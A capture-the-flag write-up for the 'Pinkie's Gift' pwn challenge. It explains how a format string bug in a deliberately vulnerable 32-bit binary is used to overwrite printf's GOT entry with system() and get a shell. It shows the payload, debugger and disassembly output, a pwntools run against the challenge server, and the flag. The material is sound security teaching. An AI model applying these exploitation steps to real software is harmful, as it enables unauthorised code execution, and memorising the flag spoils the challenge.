# Pinkie's Gift
Pwn

## Challenge 

	In this challenge, Santa Pie will give you some unusual gifts. See if you can use this wisdom to get the flag before Christmas.

	Server: nc 199.247.6.180 10006

	Author: PinkiePie1189

pinkiegift

## Solution

Program shows the following text

	Here are some gifts from Santa: 0x8049940 0xf7e2c7e0

### Not buffer overflow

Initially I thought it was a simple buffer overflow.

	$ pwn cyclic 300 | strace ./pinkiegift 
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61617163} ---
	+++ killed by SIGSEGV +++
	Segmentation fault
	
	$ pwn cyclic -l 0x61617163
	263

From debugging, we realise that the address are:

1. system() function 
2. a string with the name of binsh.

Thus, I crafted a simple payload

	$ (python -c 'from pwn import *; print( "A" * (263) + p32(0xf75f47e0) + "Junk" + p32(0x8049940) )'; cat) | ./pinkiegift 

However, it did not work because I realised that the binsh string is actually empty! The challenge creator is sneaky...

	# gdb pinkiegift
	
	(gdb) run
	Starting program: /FILES/pinkiegift 
	Here are some gifts from Santa: 0x8049940 0xf7e2c7e0
	^C
	Program received signal SIGINT, Interrupt.
	0xf7fd4b49 in __kernel_vsyscall ()
	(gdb) x 0x8049940
	0x8049940 <binsh>:	0x00000000

### Format string attack

Psuedo code from decompiling...

	void main() {
		alarm(60);
		print("Here are some gifts from Santa: 0x8049940 0xf7e2c7e0")
		fgets(&str, 128, stdin);
		printf(&str);
		gets(&str);
	}

From the code, we notice that printf() is vulnerable to format string..

Reference: 
- https://nuc13us.wordpress.com/2015/09/04/format-string-exploit-overwrite-got/
- https://ctf101.org/binary-exploitation/what-is-the-got/
- https://github.com/zst123/picoctf-2018-writeups/tree/master/Solved/authenticate
- https://github.com/phieulang1993/ctf-writeups/blob/master/2018/angstromCTF/letter/letter.py

Hence, we can put a `/bin/sh;` string using `fgets()`. After which, override the GOT entry for `printf()` to call `system()` with the param of `/bin/sh;`.


#### GOT Table

	# objdump -d pinkiegift

	Disassembly of section .plt:

	080483b0 <.plt>:
	 80483b0:	ff 35 e8 98 04 08    	pushl  0x80498e8
	 80483b6:	ff 25 ec 98 04 08    	jmp    *0x80498ec
	 80483bc:	00 00                	add    %al,(%eax)
		...

	080483c0 <printf@plt>:
	 80483c0:	ff 25 f0 98 04 08    	jmp    *0x80498f0
	 80483c6:	68 00 00 00 00       	push   $0x0
	 80483cb:	e9 e0 ff ff ff       	jmp    80483b0 <.plt>

	080483d0 <gets@plt>:
	 80483d0:	ff 25 f4 98 04 08    	jmp    *0x80498f4
	 80483d6:	68 08 00 00 00       	push   $0x8
	 80483db:	e9 d0 ff ff ff       	jmp    80483b0 <.plt>

Plan is to override the contents at 0x80498f0 with the given system() address.

#### Solving

I created a pwntools script

	# python solve.py 
	[+] Opening connection to 199.247.6.180 on port 10006: Done
	>> binsh 0x8049940
	>> system 0xf7e1a850
	>> len(payload) 16
	>> write lower 43072
	>> write upper 20369
	[*] Switching to interactive mode
	/bin/sh;??                    

	...

	$ ls
	chall
	flag
	redir.sh
	$ cat flag
	X-MAS{F0rm47_57r1ng_15_7h3_b3st_pr353n7_f0r_l1773_buff3r_0v3rfl0w}

## Flag

	X-MAS{F0rm47_57r1ng_15_7h3_b3st_pr353n7_f0r_l1773_buff3r_0v3rfl0w}
